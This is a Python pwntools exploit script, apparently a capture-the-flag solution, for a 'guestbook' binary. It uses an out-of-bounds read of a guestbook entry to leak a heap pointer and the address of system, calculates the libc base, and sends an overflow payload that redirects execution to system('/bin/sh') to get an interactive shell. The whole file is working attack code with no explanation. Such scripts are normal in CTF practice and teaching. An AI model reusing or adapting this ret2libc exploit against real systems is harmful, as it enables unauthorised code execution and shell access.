#!/usr/bin/env python3

from pwn import *

exe = ELF("./guestbook")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.23.so")

context.binary = exe


def conn():
    if args.LOCAL:
        return process([ld.path, exe.path], env={"LD_PRELOAD": libc.path})
    else:
        return remote("addr", 1337)


def main():
    r = conn()

    VIEW = "1"
    CHANGE = "2"
    QUIT = "3"

    [r.sendline("guest") for i in range(4)]
    r.sendline(VIEW)
    r.sendline("6")
    r.recvuntil("Which entry do you want to view?\n>>>")
    leak = r.recvn(24)
    chunk_ptr = u32(leak[:4])
    system = u32(leak[-4:])

    libc.address = system - libc.symbols['system']

    gdb.attach(r)
    r.sendline(CHANGE)
    r.sendline("0")
    r.sendline("A" * 100 + p32(0) + "AAAA" + p32(chunk_ptr) + "A" * 40 + "BBBB" + p32(libc.symbols['system']) + "CCCC" + p32(next(libc.search('/bin/sh\x00'))))
    r.send("\n")
    r.sendline(QUIT)
    r.interactive()


if __name__ == "__main__":
    main()
